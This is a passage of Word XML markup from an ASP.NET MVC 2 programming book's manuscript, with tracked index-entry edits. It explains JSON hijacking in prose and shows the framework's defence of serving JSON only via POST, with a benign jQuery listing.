        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="348" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="349" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve">, instructs the victim's browser to </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>request some secure JSON</w:t>
      </w:r>
      <w:ins w:id="350" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="351" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="352" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> data from another site</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F55EC0" w:rsidRDefault="00F55EC0" w:rsidP="000D356E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The evil JavaScript</w:t>
      </w:r>
      <w:ins w:id="353" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="354" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="355" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> receives the JSON</w:t>
      </w:r>
      <w:ins w:id="356" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="357" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="358" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> data</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F55EC0" w:rsidRDefault="00F55EC0" w:rsidP="00F55EC0">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="000D356E">
        <w:t>f the JSON</w:t>
      </w:r>
      <w:ins w:id="359" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="360" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="361" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D356E">
        <w:t xml:space="preserve"> is formatted as an array,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the evil script</w:t>
      </w:r>
      <w:r w:rsidR="000D356E">
        <w:t xml:space="preserve"> can exploit</w:t>
      </w:r>
      <w:ins w:id="362" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00FE14DF">
        <w:rPr>
          <w:rPrChange w:id="363" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>exploit</w:instrText>
      </w:r>
      <w:ins w:id="364" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D356E">
        <w:t xml:space="preserve"> browser JavaScript</w:t>
      </w:r>
      <w:ins w:id="365" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="366" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="367" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D356E">
        <w:t xml:space="preserve"> processing code to read the JSON data and transmit it back to the attacking site</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:t>11.3.3.1 Allow JSON</w:t>
      </w:r>
      <w:ins w:id="368" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="369" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="370" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> via POST</w:t>
      </w:r>
      <w:ins w:id="371" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="372" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>POST</w:instrText>
      </w:r>
      <w:ins w:id="373" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> only</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F55EC0" w:rsidRDefault="00F55EC0" w:rsidP="00F55EC0">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>The solution to this exploit</w:t>
      </w:r>
      <w:ins w:id="374" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00FE14DF">
        <w:rPr>
          <w:rPrChange w:id="375" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>exploit</w:instrText>
      </w:r>
      <w:ins w:id="376" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> offered by ASP.NET MVC 2 is to only accept requests for JSON</w:t>
      </w:r>
      <w:ins w:id="377" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="378" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="379" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> data by HTTP POST</w:t>
      </w:r>
      <w:ins w:id="380" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="381" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>POST</w:instrText>
      </w:r>
      <w:ins w:id="382" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> requests, rather than by GETs.  </w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">This is baked into and enforced by the standard </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>JsonResult</w:t>
      </w:r>
      <w:ins w:id="383" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="384" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JsonResult</w:instrText>
      </w:r>
      <w:ins w:id="385" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve"> action result that ships with the framework.  If we were to request data returned by </w:t>
      </w:r>
      <w:r w:rsidR="00705E20" w:rsidRPr="00705E20">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>JsonResult</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve"> with a GET</w:t>
      </w:r>
      <w:ins w:id="386" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="387" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>GET</w:instrText>
      </w:r>
      <w:ins w:id="388" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve"> request, we would not receive the JSON data. Listing 11.12 shows how we must issue a POST from JavaScript</w:t>
      </w:r>
      <w:ins w:id="389" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="390" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="391" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve"> code requesting JSON data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.12 Request JSON</w:t>
      </w:r>
      <w:ins w:id="392" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="393" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="394" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> via POST</w:t>
      </w:r>
      <w:ins w:id="395" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="396" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>POST</w:instrText>
      </w:r>
      <w:ins w:id="397" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t>&lt;script type="text/javascript"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:commentRangeStart w:id="398"/>
      <w:commentRangeStart w:id="399"/>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>$.postJSON = function(url, data, callback) {</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">               </w:t>
      </w:r>
      <w:r>
        <w:t>|</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t>#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>$.post(url, data, callback, "json");</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">               </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t>#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>};</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">                                                        </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t>#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>$(function() {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t xml:space="preserve">$.postJSON('/post/getsecurejsonpost', </w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">                     </w:t>
      </w:r>
      <w:r>
        <w:t>|</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t>#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>function(data) {</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">                                    </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>var options = '';</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">                           </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">       |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>for (var i = 0; i &lt; data.length; i++) {</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">        |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>options += '&lt;option value="' +</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>#|2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t xml:space="preserve">data[i].Id + '"&gt;' + data[i].Title + </w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">          |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>'&lt;/option&gt;';</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">           |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>}</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">                                         </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">         |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>#2</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>$('#securepost').html(options);</w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">              |</w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="003C6B7A" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="009439E4" w:rsidRPr="009439E4">
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="009439E4">
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009439E4" w:rsidRPr="009439E4" w:rsidRDefault="009439E4" w:rsidP="009439E4">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
    </w:p>
